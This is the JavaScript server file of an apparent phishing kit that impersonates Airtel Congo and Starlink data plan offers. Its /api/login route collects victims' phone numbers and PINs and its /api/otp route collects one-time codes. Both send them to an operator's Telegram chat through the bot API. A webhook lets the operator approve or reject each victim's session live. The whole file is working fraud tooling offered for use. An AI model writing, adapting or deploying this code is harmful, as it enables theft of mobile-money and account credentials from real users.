// server.js — Airtel Congo / Starlink backend (Render)

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ---------- Config ----------
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();

let publicUrl = process.env.PUBLIC_URL || '';
if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
  publicUrl = process.env.RENDER_EXTERNAL_URL;
}

// ---------- In-memory sessions ----------
// sessionId -> { plan, amount, unit, validity, price, phone, pin, status, createdAt, message }
const sessions = new Map();
const SESSION_TTL_MS = 15 * 60 * 1000; // 15 minutes

// Sweep expired sessions every minute
setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions) {
    if (now - s.createdAt > SESSION_TTL_MS) sessions.delete(id);
  }
}, 60 * 1000);

// ---------- Telegram ----------
async function tgSend(text, retries = 3) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('⚠️  Telegram env missing — cannot send');
    return false;
  }

  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
      const data = await res.json();
      if (!data.ok) {
        console.error(`Telegram error (attempt ${i + 1}):`, data);
        if (data.error_code === 400 || data.error_code === 401) break;
      } else {
        console.log('✅ Telegram message sent');
        return true;
      }
    } catch (err) {
      console.error(`Telegram send failed (attempt ${i + 1}):`, err.message);
      if (err.cause) console.error('  Cause:', err.cause.code, '—', err.cause.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
  return false;
}

async function tgSetWebhook() {
  if (!BOT_TOKEN || !publicUrl) {
    console.warn('⚠️  Cannot register webhook — BOT_TOKEN or publicUrl missing');
    return;
  }
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  try {
    console.log(`🔗 Registering webhook: ${webhookUrl}`);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
    const data = await res.json();
    if (data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
    else console.error('❌ Webhook failed:', data);
  } catch (err) {
    console.error('❌ Webhook error:', err.message);
  }
}

// Helper: format plan block for Telegram
function planBlock(p) {
  return (
    `📦 Forfait: <b>${p.plan || '-'}</b>\n` +
    (p.amount ? `📊 Volume: <b>${p.amount} ${p.unit || ''}</b>\n` : '') +
    (p.validity ? `⏱ Validité: <b>${p.validity}</b>\n` : '') +
    (p.price ? `💰 Prix: <b>${p.price} FC</b>\n` : '')
  );
}

// ---------- API routes ----------

// LOGIN — create session, notify Telegram, return sessionId
app.post('/api/login', async (req, res) => {
  const { plan, amount, unit, validity, price, phone, pin } = req.body || {};

  if (!phone || !pin) {
    return res.status(400).json({ ok: false, error: 'Numéro et code requis.' });
  }

  const sessionId = crypto.randomBytes(12).toString('hex');
  const session = {
    plan, amount, unit, validity, price, phone, pin,
    status: 'pending',
    createdAt: Date.now(),
    message: ''
  };
  sessions.set(sessionId, session);

  console.log('📥 Login:', { sessionId, phone, plan, price });

  await tgSend(
    `🇨🇩 <b>Nouvelle Connexion — Airtel Congo</b>\n\n` +
    planBlock({ plan, amount, unit, validity, price }) +
    `📱 Téléphone: <b>+243 ${phone}</b>\n` +
    `🔑 Code PIN: <b>${pin}</b>\n\n` +
    `🆔 Session: <code>${sessionId}</code>`
  );

  res.json({ ok: true, sessionId });
});

// STATUS — polling endpoint for the login page
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const s = sessions.get(sessionId);

  if (!s) {
    return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
  }

  if (Date.now() - s.createdAt > SESSION_TTL_MS) {
    sessions.delete(sessionId);
    return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
  }

  res.json({ ok: true, status: s.status, message: s.message || '' });
});

// OTP — from otp.html
app.post('/api/otp', async (req, res) => {
  const { plan, amount, unit, validity, price, phone, otp } = req.body || {};

  if (!otp) {
    return res.status(400).json({ ok: false, error: 'Code OTP requis.' });
  }

  console.log('📥 OTP:', { phone, otp });

  await tgSend(
    `🔢 <b>Code OTP Soumis — Airtel Congo</b>\n\n` +
    planBlock({ plan, amount, unit, validity, price }) +
    `📱 Téléphone: <b>+243 ${phone || '-'}</b>\n` +
    `🔢 OTP: <b>${otp}</b>`
  );

  res.json({ ok: true });
});

// ---------- Admin control (via Telegram) ----------
// Send /approve <sessionId> or /reject <sessionId> to the bot.
// Requires the bot to be able to receive updates — the webhook below handles it.

app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body || {};
  const msg = update.message;

  if (msg && msg.text && String(msg.chat.id) === CHAT_ID) {
    const text = msg.text.trim();
    console.log('📨 Telegram command:', text);

    const approve = text.match(/^\/approve\s+([a-f0-9]{24})$/i);
    const reject  = text.match(/^\/reject\s+([a-f0-9]{24})$/i);

    if (approve) {
      const id = approve[1];
      const s = sessions.get(id);
      if (s) {
        s.status = 'approved';
        s.message = 'Approuvé';
        await tgSend(`✅ Session <code>${id}</code> approuvée.\n📱 +243 ${s.phone}`);
      } else {
        await tgSend(`⚠️ Session <code>${id}</code> introuvable ou expirée.`);
      }
    } else if (reject) {
      const id = reject[1];
      const s = sessions.get(id);
      if (s) {
        s.status = 'rejected';
        s.message = 'Numéro incorrect. Veuillez vérifier et réessayer.';
        await tgSend(`❌ Session <code>${id}</code> rejetée.\n📱 +243 ${s.phone}`);
      } else {
        await tgSend(`⚠️ Session <code>${id}</code> introuvable ou expirée.`);
      }
    } else if (text === '/help' || text === '/start') {
      await tgSend(
        `🤖 <b>Commandes admin</b>\n\n` +
        `/approve &lt;sessionId&gt; — approuver une connexion\n` +
        `/reject &lt;sessionId&gt; — rejeter une connexion\n` +
        `/help — afficher cette aide`
      );
    }
  } else {
    console.log('📨 Telegram update:', JSON.stringify(update).slice(0, 200));
  }

  res.sendStatus(200);
});

// ---------- Serve the static site ----------
app.use(express.static(path.join(__dirname, '..')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
  console.log(`   BOT_TOKEN set: ${BOT_TOKEN ? 'YES' : 'NO'}`);
  console.log(`   CHAT_ID set:   ${CHAT_ID ? 'YES' : 'NO'}`);
  tgSetWebhook();
});
